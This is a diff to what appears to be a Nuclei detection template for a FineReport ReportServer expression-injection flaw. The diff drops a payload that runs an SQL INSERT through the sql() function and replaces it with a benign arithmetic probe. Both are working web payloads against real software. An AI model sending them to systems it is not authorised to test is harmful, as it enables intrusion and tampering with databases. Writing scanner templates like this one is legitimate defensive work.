@@ -15,24 +15,22 @@ info:
   tags: finereport,rce,sqli
 
 variables:
-    string: '{{rand_base(8, "abc")}}'
-    random-text: '{{rand_base(8)}}'
+  string: '{{rand_base(8, "abc")}}'
 
 http:
   - raw:
       - |
-        GET /webroot/decision/view/ReportServer?test={{random-text}}&n=${a=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{random-text}}.{{random-text}}%28data%29%20VALUES%20%28%274de0353d63cc9ab4286361a4ff3f12d1%27%29%3B%27'),1,1)}${a=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{random-text}}.{{random-text}}%28data%29%20VALUES%20%28%274de0353d63cc9ab4286361a4ff3f12d1%27%29%3B%27'),1,1)}${a=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20{{random-text}}.{{random-text}}%28data%29%20VALUES%20%28%274de0353d63cc9ab4286361a4ff3f12d1%27%29%3B%27'),1,1)} HTTP/1.1
+        GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,1)} HTTP/1.1
         Host: {{Hostname}}
-        Connection: close
         Content-Type: application/x-www-form-urlencoded
-        X-Forwarded-For: 127.0.0.1
-        Accept-Encoding: gzip, deflate
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-        Accept: */*
-    
+
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(location,"test={{random-text}}&n=truetruetrue")'
-          - 'status_code == 302'
-        condition: and
+      - type: word
+        part: location
+        words:
+          - 'report?{{string}}&n=1025'
+
+      - type: status
+        status:
+          - 200
